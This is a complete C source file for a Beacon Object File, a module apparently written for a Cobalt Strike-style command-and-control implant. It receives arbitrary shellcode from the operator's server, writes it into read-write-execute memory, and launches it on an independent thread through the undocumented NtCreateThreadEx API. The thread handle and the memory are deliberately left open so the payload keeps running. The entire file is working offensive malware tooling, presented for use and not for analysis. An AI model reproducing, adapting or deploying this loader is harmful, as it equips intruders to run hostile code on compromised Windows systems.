/*
 * shellcode_exec_nt.c - Shellcode execution using NtCreateThreadEx.
 *
 * Uses undocumented NtCreateThreadEx Native API for more reliable thread creation.
 * This ensures the thread is completely independent from BOF execution context.
 *
 * Build (MinGW-w64):
 *   x86_64-w64-mingw32-gcc -c shellcode_exec_nt.c -o shellcode_exec_nt.o
 *
 * Usage from server:
 *   Upload shellcode_exec_nt.o, set args = raw shellcode bytes
 */

#include <windows.h>
#include "beacon.h"

typedef LONG NTSTATUS;
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)

DECLSPEC_IMPORT LPVOID WINAPI KERNEL32$VirtualAlloc(LPVOID, SIZE_T, DWORD, DWORD);
DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$GetCurrentProcess(void);
DECLSPEC_IMPORT VOID   WINAPI KERNEL32$Sleep(DWORD);

/* NtCreateThreadEx - undocumented Native API */
DECLSPEC_IMPORT NTSTATUS NTAPI NTDLL$NtCreateThreadEx(
    PHANDLE ThreadHandle,
    ACCESS_MASK DesiredAccess,
    PVOID ObjectAttributes,
    HANDLE ProcessHandle,
    PVOID StartRoutine,
    PVOID Argument,
    ULONG CreateFlags,
    SIZE_T ZeroBits,
    SIZE_T StackSize,
    SIZE_T MaximumStackSize,
    PVOID AttributeList
);

#define MEM_COMMIT_VAL     0x00001000
#define MEM_RESERVE_VAL    0x00002000
#define PAGE_EXECUTE_READWRITE_VAL 0x40
#define THREAD_ALL_ACCESS 0x1FFFFF

static void bof_memcpy(void* dst, const void* src, unsigned long long n) {
    unsigned char* d = (unsigned char*)dst;
    const unsigned char* s = (const unsigned char*)src;
    while (n--) *d++ = *s++;
}

void go(char* args, int alen)
{
    char* shellcode_data = NULL;
    int shellcode_len = 0;

    if (args != NULL && alen >= 2) {
        datap parser;
        BeaconDataParse(&parser, args, alen);
        shellcode_data = BeaconDataExtract(&parser, &shellcode_len);
    }

    if (shellcode_data == NULL || shellcode_len <= 0) {
        BeaconOutput(CALLBACK_ERROR, "No shellcode provided\n", 21);
        return;
    }

    if (shellcode_len > 10 * 1024 * 1024) {
        BeaconOutput(CALLBACK_ERROR, "Shellcode too large (max 10MB)\n", 32);
        return;
    }

    /* Allocate RWX memory */
    LPVOID exec_mem = KERNEL32$VirtualAlloc(
        NULL,
        shellcode_len,
        MEM_COMMIT_VAL | MEM_RESERVE_VAL,
        PAGE_EXECUTE_READWRITE_VAL
    );

    if (exec_mem == NULL) {
        BeaconOutput(CALLBACK_ERROR, "VirtualAlloc failed\n", 20);
        return;
    }

    /* Copy shellcode */
    bof_memcpy(exec_mem, shellcode_data, shellcode_len);

    /* Create thread using NtCreateThreadEx for better isolation */
    HANDLE hThread = NULL;
    NTSTATUS status = NTDLL$NtCreateThreadEx(
        &hThread,
        THREAD_ALL_ACCESS,
        NULL,                           // ObjectAttributes
        KERNEL32$GetCurrentProcess(),   // ProcessHandle
        exec_mem,                       // StartRoutine
        NULL,                           // Argument
        0,                              // CreateFlags (0 = run immediately)
        0,                              // ZeroBits
        0,                              // StackSize (default)
        0,                              // MaximumStackSize (default)
        NULL                            // AttributeList
    );

    if (!NT_SUCCESS(status) || hThread == NULL) {
        BeaconOutput(CALLBACK_ERROR, "NtCreateThreadEx failed\n", 25);
        return;
    }

    /* Sleep briefly to let thread initialize before BOF returns */
    KERNEL32$Sleep(500);

    /* Don't close handle - let thread run independently */
    /* Memory is intentionally leaked to keep shellcode alive */
    BeaconOutput(CALLBACK_OUTPUT, "Shellcode thread created (NtCreateThreadEx)\n", 45);
}
